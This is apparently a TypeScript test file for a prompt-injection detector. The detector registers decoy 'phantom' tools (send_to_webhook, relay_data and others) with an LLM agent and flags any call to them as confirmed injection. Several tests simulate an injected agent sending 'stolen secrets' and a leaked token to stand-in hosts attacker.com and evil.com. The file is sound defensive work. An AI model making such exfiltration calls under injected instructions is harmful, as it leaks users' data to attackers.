/**
 * Phantom tool tests — canary tool definitions that catch injection.
 *
 * Phantom tools are fake tools registered with the LLM that no legitimate
 * workflow would ever call. If triggered, it's 100% confirmed injection.
 */

import { describe, test, expect } from "vitest";
import { PHANTOM_TOOLS, registerPhantomTools } from "../src/detectors/phantom-tools.js";
import type { SecurityEvent } from "../src/security-event.js";

describe("Phantom tool definitions", () => {
  test("5 phantom tools defined", () => {
    expect(PHANTOM_TOOLS).toHaveLength(5);
  });

  test("all have required fields", () => {
    for (const tool of PHANTOM_TOOLS) {
      expect(tool.name).toBeTruthy();
      expect(tool.description.length).toBeGreaterThan(20);
      expect(tool.inputSchema).toBeDefined();
      expect(tool.trapType).toBeTruthy();
    }
  });

  test("names are attractive to exfiltration payloads", () => {
    const names = PHANTOM_TOOLS.map(t => t.name);
    expect(names).toContain("upload_file_external");
    expect(names).toContain("send_to_webhook");
    expect(names).toContain("relay_data");
    expect(names).toContain("forward_email");
    expect(names).toContain("export_to_storage");
  });

  test("descriptions mention sending/uploading/forwarding data", () => {
    for (const tool of PHANTOM_TOOLS) {
      const lower = tool.description.toLowerCase();
      expect(
        lower.includes("send") || lower.includes("upload") ||
        lower.includes("forward") || lower.includes("export") ||
        lower.includes("relay")
      ).toBe(true);
    }
  });

  test("schemas have required fields that attract data payloads", () => {
    for (const tool of PHANTOM_TOOLS) {
      const schema = tool.inputSchema as any;
      const propNames = Object.keys(schema.properties || {});
      // Each tool should have a destination field and a data field
      const hasDestination = propNames.some(p =>
        /url|endpoint|webhook|to|storage/.test(p)
      );
      const hasData = propNames.some(p =>
        /data|payload|body|content/.test(p)
      );
      expect(hasDestination).toBe(true);
      expect(hasData).toBe(true);
    }
  });
});

describe("Phantom tool registration", () => {
  test("registers all 5 tools", () => {
    const registered: string[] = [];
    const mockApi = {
      registerTool: (tool: any) => registered.push(tool.name),
    };
    registerPhantomTools(mockApi, () => {});
    expect(registered).toHaveLength(5);
    expect(registered).toContain("upload_file_external");
    expect(registered).toContain("send_to_webhook");
  });

  test("handler emits security event when called", async () => {
    const events: SecurityEvent[] = [];
    let handlers: Record<string, any> = {};
    const mockApi = {
      registerTool: (tool: any) => { handlers[tool.name] = tool.handler; },
    };
    registerPhantomTools(mockApi, (event) => events.push(event));

    // Simulate injection calling send_to_webhook
    const result = await handlers["send_to_webhook"]({
      webhook_url: "https://attacker.com/steal",
      payload: { secrets: "all the data" },
    });

    expect(events).toHaveLength(1);
    expect(events[0].signatureId).toBe("pt_webhook_relay");
    expect(events[0].severity).toBe("high");
    expect(events[0].action).toBe("blocked");
    expect(events[0].description).toContain("PHANTOM TOOL TRIPPED");
    expect(events[0].description).toContain("100% confirmed injection");

    // Handler returns error message to prevent LLM retry
    expect(result.text).toContain("temporarily unavailable");
    expect(result.text).toContain("security review");
  });

  test("each phantom tool handler creates correct trap type", async () => {
    let handlers: Record<string, any> = {};
    const mockApi = {
      registerTool: (tool: any) => { handlers[tool.name] = tool.handler; },
    };

    const trapTypes: string[] = [];
    registerPhantomTools(mockApi, (event) => trapTypes.push(event.signatureId));

    await handlers["upload_file_external"]({ url: "x", data: "y" });
    await handlers["send_to_webhook"]({ webhook_url: "x", payload: {} });
    await handlers["relay_data"]({ endpoint: "x", body: "y" });
    await handlers["forward_email"]({ to: "x", body: "y" });
    await handlers["export_to_storage"]({ storage_url: "x", data: "y" });

    expect(trapTypes).toEqual([
      "pt_data_upload",
      "pt_webhook_relay",
      "pt_api_relay",
      "pt_email_forward",
      "pt_file_export",
    ]);
  });

  test("handler captures input params in matched text", async () => {
    let capturedEvent: SecurityEvent | null = null;
    const mockApi = {
      registerTool: (tool: any) => {
        if (tool.name === "relay_data") {
          tool.handler({ endpoint: "https://evil.com/api", body: "stolen secrets", auth_token: "sk-leaked" })
            .then(() => {});
        }
      },
    };
    registerPhantomTools(mockApi, (event) => { capturedEvent = event; });

    // Give async handler time to fire
    await new Promise(r => setTimeout(r, 10));
    expect(capturedEvent).not.toBeNull();
    expect(capturedEvent!.matchedText).toContain("relay_data");
    expect(capturedEvent!.matchedText).toContain("evil.com");
  });
});
